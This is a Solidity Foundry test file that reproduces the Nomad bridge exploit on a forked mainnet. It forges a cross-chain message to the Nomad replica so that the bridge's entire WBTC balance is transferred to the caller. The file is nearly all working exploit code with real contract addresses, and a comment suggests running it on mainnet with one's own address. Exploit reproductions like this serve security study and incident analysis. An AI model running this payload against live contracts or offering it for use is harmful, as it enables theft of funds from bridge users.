// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IERC20} from "../../interfaces/IERC20.sol";

import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";

interface INomadReplica {
    function initialize(
        uint32 _remoteDomain,
        address _updater,
        bytes32 _committedRoot,
        uint256 _optimisticSeconds
    ) external;
    function process(bytes memory _message) external returns (bool _success);
    function acceptableRoot(bytes32 _root) external view returns (bool);
}

contract Exploit_Nomad is TestHarness, TokenBalanceTracker {
    address internal constant NOMAD_DEPLOYER = 0xA5bD5c661f373256c0cCfbc628Fd52DE74f9BB55;
    address internal constant attacker = address(0xa8C83B1b30291A3a1a118058b5445cC83041Cd9d);

    uint32 internal constant ETHEREUM = 0x657468; // "eth"
    uint32 internal constant MOONBEAM = 0x6265616d; // "beam"

    INomadReplica internal constant replicaProxy = INomadReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA);
    INomadReplica internal constant replica = INomadReplica(0xB92336759618F55bd0F8313bd843604592E27bd8);

    address internal constant bridgeRouter = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
    address internal constant ercBridge = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;

    IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 15_259_100); // We pin one block before the attacker
            // starts to drain the bridge after he sent the 0.1 WBTC tx on Moonbeam.
        cheat.label(NOMAD_DEPLOYER, "Nomad Deployer");

        addTokenToTracker(address(WBTC));

        console.log("\nInitial balances:");
        updateBalanceTracker(ercBridge);
        updateBalanceTracker(address(this));
    }

    function test_attack() external {
        uint256 balanceAttackerBefore = WBTC.balanceOf(address(this));

        logBalancesWithLabel("Bridge", ercBridge);
        logBalancesWithLabel("Attacker", address(this));

        // Try changing address(this) for your address in mainnet ;)
        bytes memory payload = getPayload(address(this), address(WBTC), WBTC.balanceOf(ercBridge));

        emit log_named_bytes("Tx Payload", payload);

        bool success = replicaProxy.process(payload);
        require(success, "Process failed");

        console.log("Final balances:");
        logBalancesWithLabel("Bridge", ercBridge);
        logBalancesWithLabel("Attacker", address(this));

        uint256 balanceAttackerAfter = WBTC.balanceOf(address(this));
        assertGe(balanceAttackerAfter, balanceAttackerBefore);
    }

    function getPayload(address recipient, address token, uint256 amount)
        public
        pure
        returns (bytes memory)
    {
        bytes memory payload = abi.encodePacked(
            MOONBEAM, // Home chain domain
            uint256(uint160(bridgeRouter)), // Sender: bridge
            uint32(0), // Dst nonce
            ETHEREUM, // Dst chain domain
            uint256(uint160(ercBridge)), // Recipient (Nomad ERC20 bridge)
            ETHEREUM, // Token domain
            uint256(uint160(token)), // token id (e.g. WBTC)
            uint8(0x3), // Type - transfer
            uint256(uint160(recipient)), // Recipient of the transfer
            uint256(amount), // Amount (e.g. 10000000000)
            uint256(0) // Optional: Token details hash
                // keccak256(
                //     abi.encodePacked(
                //         bytes(tokenName).length,
                //         tokenName,
                //         bytes(tokenSymbol).length,
                //         tokenSymbol,
                //         tokenDecimals
                //     )
                // )
        );

        return payload;
    }
}
